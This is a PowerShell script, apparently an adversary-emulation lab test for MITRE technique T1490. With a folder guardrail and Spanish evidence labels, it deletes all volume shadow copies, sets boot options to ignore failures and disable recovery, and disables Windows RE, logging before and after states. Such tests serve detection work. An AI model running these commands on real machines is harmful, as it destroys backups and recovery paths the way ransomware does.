$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA063*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'; New-Item -ItemType Directory -Force -Path $ev | Out-Null
$tools = @('vssadmin.exe','bcdedit.exe','reagentc.exe')
foreach ($t in $tools) { $src = Join-Path $env:SystemRoot ("System32\" + $t); if (Test-Path $src) { Copy-Item $src (Join-Path $dir $t) -Force -ErrorAction SilentlyContinue } }
$vss = if (Test-Path (Join-Path $dir 'vssadmin.exe')) { Join-Path $dir 'vssadmin.exe' } else { 'vssadmin.exe' }
$bcd = if (Test-Path (Join-Path $dir 'bcdedit.exe')) { Join-Path $dir 'bcdedit.exe' } else { 'bcdedit.exe' }
$reg = if (Test-Path (Join-Path $dir 'reagentc.exe')) { Join-Path $dir 'reagentc.exe' } else { 'reagentc.exe' }
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$vss0 = & $vss list shadows 2>&1 | Out-String
& $vss delete shadows /all /quiet 2>&1 | Out-File (Join-Path $ev 'vssadmin.out') -Encoding ascii
$bcd0 = & $bcd /enum "{default}" 2>&1 | Out-String
& $bcd /set "{default}" bootstatuspolicy ignoreallfailures 2>&1 | Out-File (Join-Path $ev 'bcdedit_bootstatuspolicy.out') -Encoding ascii
& $bcd /set "{default}" recoveryenabled no 2>&1 | Out-File (Join-Path $ev 'bcdedit_recoveryenabled.out') -Encoding ascii
$reg0 = & $reg /info 2>&1 | Out-String
& $reg /disable 2>&1 | Out-File (Join-Path $ev 'reagentc_disable.out') -Encoding ascii
$bcd1 = & $bcd /enum "{default}" 2>&1 | Out-String
$reg1 = & $reg /info 2>&1 | Out-String
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$salida = @(
    "ata=ATA063", "tecnica=T1490", "fuente=ART_adaptado",
    "guid=43819286-91a9-4369-90ed-d31fb4da2c01+cf21060a-80b3-4238-a595-22525de4ab81",
    "t0=$t0", "t1=$t1",
    "bcdedit_recoveryenabled_no=" + [bool]($bcd1 -match 'recoveryenabled\s+No'),
    "bcdedit_bootstatuspolicy_ignore=" + [bool]($bcd1 -match 'IgnoreAllFailures'),
    "reagentc_disabled=" + [bool]($reg1 -match 'Disabled'),
    "vssadmin_list_antes_len=" + $vss0.Length
)
$salida | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
$bcd0 | Out-File -FilePath (Join-Path $ev 'bcdedit_antes.txt') -Encoding ascii
$bcd1 | Out-File -FilePath (Join-Path $ev 'bcdedit_despues.txt') -Encoding ascii
$reg1 | Out-File -FilePath (Join-Path $ev 'reagentc_despues.txt') -Encoding ascii
exit 0
